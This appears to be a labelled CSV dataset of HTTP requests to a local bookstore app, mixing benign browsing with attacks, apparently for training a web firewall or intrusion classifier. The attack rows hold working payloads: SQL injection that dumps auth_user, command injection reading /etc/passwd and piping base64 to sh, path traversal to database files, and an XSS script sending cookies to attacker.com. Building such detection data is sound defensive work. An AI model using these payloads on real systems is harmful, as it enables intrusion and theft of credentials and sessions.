method,path,query_params,headers,body,client_ip,user_agent,label,attack_type
GET,/api/search/,q=tech&category=1,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66"", ""Accept"": ""application/json"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,172.16.1.113,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66",0,BENIGN
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; whoami""}",203.0.113.45,Wget/1.21.3,4,CMD
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""admin' #"", ""password"": ""admin123""}",192.168.1.152,Go-http-client/1.1,1,SQLI
GET,/ebooks/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,172.16.1.233,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0,0,BENIGN
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""sarah_connor"", ""password"": ""ResistancePass123""}",192.168.1.146,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",0,BENIGN
GET,/api/v1/vulnerable/books/search/,q=tech&category=6,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,10.0.0.73,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",0,BENIGN
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""tech_enthusiast"", ""password"": ""SuperSecurePass_88""}",192.168.1.18,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",0,BENIGN
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; `w'h'o'a'm'i`""}",198.51.100.23,Wget/1.21.3,4,CMD
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1| $(c'a't /etc/passwd)""}",172.16.5.55,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),4,CMD
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""' AND 1=2--"", ""password"": ""123456""}",192.168.1.210,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",1,SQLI
GET,/books/,category=' OR 2>1#,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.210,curl/8.4.0,1,SQLI
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; netstat -an""}",198.51.100.23,Wget/1.21.3,4,CMD
GET,/api/search/,q=app&page=4,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,10.0.0.163,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",0,BENIGN
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""python-requests/2.31.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; $(id)""}",198.51.100.77,python-requests/2.31.0,4,CMD
GET,/books/,category=4&sort=popular,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,192.168.1.10,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",0,BENIGN
GET,/api/v1/vulnerable/books/search/,q=admin' #,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.210,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",1,SQLI
GET,/api/v1/books/30/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,172.16.2.138,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66",0,BENIGN
GET,/api/v1/vulnerable/books/search/,q=' OR 5-2=3--,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.152,curl/8.4.0,1,SQLI
POST,/api/v1/vulnerable/reviews/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""book_id"": 1, ""rating"": 5, ""review_text"": ""Sách hay! <script>fetch('http://attacker.com', {body: document.cookie})</script>""}",10.0.0.99,Wget/1.21.3,2,XSS
GET,/api/v1/vulnerable/files/download/,file=..///..///manage.py,"{""Host"": ""localhost:8000"", ""User-Agent"": ""python-requests/2.31.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.151,python-requests/2.31.0,3,PATH
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""<script>alert(1)</script>"", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""<script>alert(1)</script>""}",10.0.0.99,Go-http-client/1.1,2,XSS
GET,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,10.0.0.17,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0,0,BENIGN
GET,/api/v1/vulnerable/files/download/,file=../../data/waf_security.db%00.pdf,"{""Host"": ""localhost:8000"", ""User-Agent"": ""sqlmap/1.7.11#stable (https://sqlmap.org)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,198.51.100.23,sqlmap/1.7.11#stable (https://sqlmap.org),3,PATH
GET,/profile/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,10.0.0.112,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0,0,BENIGN
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""<img src='invalid' onerror='alert(\""XSS\"")'>"", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""<img src='invalid' onerror='alert(\""XSS\"")'>""}",172.16.4.12,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",2,XSS
GET,/api/v1/vulnerable/books/search/,q=' AND 1=1--,"{""Host"": ""localhost:8000"", ""User-Agent"": ""python-requests/2.31.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,198.51.100.77,python-requests/2.31.0,1,SQLI
GET,/about/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,172.16.1.102,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",0,BENIGN
GET,/about/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,172.16.1.141,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",0,BENIGN
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; echo d2hvYW1p | base64 -d | sh""}",172.16.4.12,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",4,CMD
GET,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,10.0.0.40,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66",0,BENIGN
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""' UNION SELECT null, username, password, null FROM auth_user--"", ""password"": """"}",203.0.113.45,Nikto/2.1.6,1,SQLI
GET,/books/19/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,10.0.0.87,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",0,BENIGN
GET,/static/../../../../sqlite3.db,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.151,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),3,PATH
GET,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,192.168.1.103,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",0,BENIGN
GET,/api/v1/vulnerable/books/search/,q=cloud&page=2,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,172.16.1.141,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0,0,BENIGN
POST,/cart/add/20/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""quantity"": 2}",192.168.1.172,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66",0,BENIGN
GET,/api/search/,q=Yuval+Noah+Harari&category=4,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.105 Mobile Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.153,"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.105 Mobile Safari/537.36",0,BENIGN
GET,/api/v1/vulnerable/books/search/,q=Haruki+Murakami&page=5,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1"", ""Accept"": ""application/json"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.231,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",0,BENIGN
GET,/cart/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,172.16.2.115,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66",0,BENIGN
GET,/api/v1/books/,page=7&category_id=4,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.105 Mobile Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.66,"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.105 Mobile Safari/537.36",0,BENIGN
GET,/api/search/,q=FastAPI&category=1,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.129,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66",0,BENIGN
GET,/categories/5/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,192.168.1.166,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66",0,BENIGN
GET,/api/v1/books/58/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,10.0.0.72,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66",0,BENIGN
GET,/api/v1/vulnerable/books/search/,q=Nguyen+Nhat+Anh,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,172.16.2.90,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",0,BENIGN
GET,/api/v1/vulnerable/books/search/,q='/**/OR/**/'1'='1,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,203.0.113.45,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",1,SQLI
GET,/api/v1/vulnerable/books/search/,q=admin'/*,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.151,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,1,SQLI
